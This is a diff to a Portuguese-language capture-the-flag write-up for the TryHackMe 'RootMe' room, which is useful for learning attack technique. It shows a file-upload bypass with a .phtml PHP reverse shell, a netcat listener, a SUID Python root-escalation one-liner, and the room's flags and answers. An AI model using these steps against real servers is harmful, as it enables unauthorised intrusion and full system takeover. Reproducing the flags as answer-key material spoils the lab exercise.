@@ -4,7 +4,7 @@
 [ TARGET ] 10.67.146.47
 [ ROOM   ] RootMe
 [ GOAL   ] user.txt / root.txt
-[ STATUS ] PARTIAL — RCE + vetor privesc; flags não salvas
+[ STATUS ] DONE
 ```
 
 ## 01 — Recon (nmap)
@@ -16,42 +16,39 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
 ```
 
-→ Achado: SSH + HTTP. (raw: `recuperado.txt`)
-→ Próximo: enum upload / webshell.
+→ Achado: 2 portas (SSH + HTTP). Room Q: hidden dir `/panel/`.
 
 ## 02 — Upload bypass (.phtml)
 
 ```console
-$ # php bloqueado no upload → bypass com .phtml
-$ # payload: php-reverse-shell.phtml
-# LHOST (VPN lab): 192.168.136.19
+$ # /panel → upload; .php bloqueado → bypass .phtml
+$ # trigger via /uploads/…
+$ nc -n -l -p 1234
 ```
 
 ```console
-$ nc -n -l -p 1234
-# trigger do shell via URL do upload
+$ find / -type f -name user.txt 2>/dev/null
+$ cat /var/www/user.txt
+THM{y0u_g0t_a_sh3ll}
 ```
-
-→ Achado: reverse shell via `php-reverse-shell.phtml`.
-→ Artefato: `php-reverse-shell.phtml`
 
 ## 03 — Privesc (SUID python)
 
 ```console
-$ /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-# shell com euid elevado (bit -p)
-```
+$ find / -user root -perm -4000 2>/dev/null
+/usr/bin/python   # (weird)
 
-→ Achado: Python 2.7 SUID → root shell.
-→ Próximo: `cat` user/root flags e registrar abaixo.
+$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+$ cat /root/root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
+```
 
 ## FLAGS / RESPOSTAS
 
 | Item | Valor |
 |---|---|
-| user.txt | *(completar)* |
-| root.txt | *(completar)* |
-
-## Artefatos
-
-`recuperado.txt` · `php-reverse-shell.phtml`
+| open ports | `2` |
+| hidden dir | `/panel/` |
+| weird SUID | `/usr/bin/python` |
+| user.txt | `THM{y0u_g0t_a_sh3ll}` |
+| root.txt | `THM{pr1v1l3g3_3sc4l4t10n}` |
